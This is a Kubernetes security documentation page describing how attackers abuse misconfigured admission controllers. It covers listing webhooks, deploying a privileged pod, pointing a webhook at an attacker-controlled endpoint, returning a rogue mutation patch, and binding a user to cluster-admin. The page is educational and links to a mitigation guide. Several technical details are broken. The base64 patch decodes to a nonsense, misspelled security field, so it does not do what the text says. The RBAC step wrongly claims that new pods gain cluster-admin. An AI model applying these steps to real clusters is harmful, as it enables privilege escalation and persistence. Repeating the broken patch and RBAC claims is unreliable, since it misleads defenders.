---
sidebar_position: 8
title: "Misconfigured Admission Controllers"
description: "How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."
keywords: [kubernetes security, admission controllers, webhook security, policy bypass, validating webhook, mutating webhook, OPA, pod security policy, admission control, security policy]
tags: [attack-vector, admission-control, policy, CKS]
related:
  - /docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation/
  - /docs/best_practices/cluster_setup_and_hardening/api_server_security/opa_gatekeeper/
  - /docs/best_practices/cluster_setup_and_hardening/api_server_security/kyverno/
  - /docs/best_practices/cluster_setup_and_hardening/pod_security/pod_security_standards/
---

# Misconfigured Admission Controllers

Kubernetes **admission controllers** intercept and validate requests before they reach the API server. When improperly configured—such as being disabled, weakly enforced, or exposing insecure webhooks—they become a key target for attackers seeking to **bypass security controls, escalate privileges, or persist within the cluster**.

---

## Exploitation Steps

### 1. Identify Disabled or Weak Admission Controllers

The attacker identifies which admission controllers are missing or misconfigured.

```bash
kubectl api-versions | grep admission
ps aux | grep kube-apiserver
```

If **PodSecurity**, **ValidatingAdmissionWebhook**, or **MutatingAdmissionWebhook** are missing, or misconfigured, the attacker proceeds.

---

### 2. Deploy Privileged Pods

Without proper admission policies, an attacker can launch pods that break security boundaries.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
    - name: exploit-container
      image: alpine
      securityContext:
        privileged: true
```

If **PodSecurity admission** is missing or misconfigured, this pod will be created without restriction.

---

### 3. Discover and Inspect Webhooks

The attacker lists and inspects webhook configurations:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations
kubectl describe mutatingwebhookconfiguration <webhook-name>
```

If a webhook forwards to an **unauthenticated external endpoint**, the attacker crafts a malicious configuration.

```yaml
clientConfig:
  url: "http://attacker-controlled-endpoint/webhook"
```

---

### 4. Hijack Webhook Behavior

The attacker spins up a rogue webhook server that modifies pod requests before creation:

```json
{
  "apiVersion": "admission.k8s.io/v1",
  "kind": "AdmissionReview",
  "response": {
    "allowed": true,
    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvdGVtcGxhdGUvc2VjdXJpdHlDb250ZXh0IiwidmFsdWUiOnsiYnJ1bnRhaW5lc2NhcGVzIjp7ImFsbG93UHJpdmlsZWdlZEVzY2FsYXRpb24iOnRydWV9fX1d"
  }
}
```

This patch adds privileged context to every created pod.

---

### 5. Maintain Persistence via ClusterRoleBinding

The attacker configures the webhook to inject RBAC permissions:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: attacker-binding
subjects:
  - kind: User
    name: attacker
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

This ensures **new pods receive cluster-admin privileges**, even after the attacker is removed from the system.

---

### Result

The attacker successfully **bypasses admission controllers**, injects **malicious pod configurations**, and gains **persistent cluster access** through insecure webhook logic and privilege escalation.

---

## Mitigation

➡ [See Mitigation Guide for Misconfigured Admission Controllers](/docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation.md)
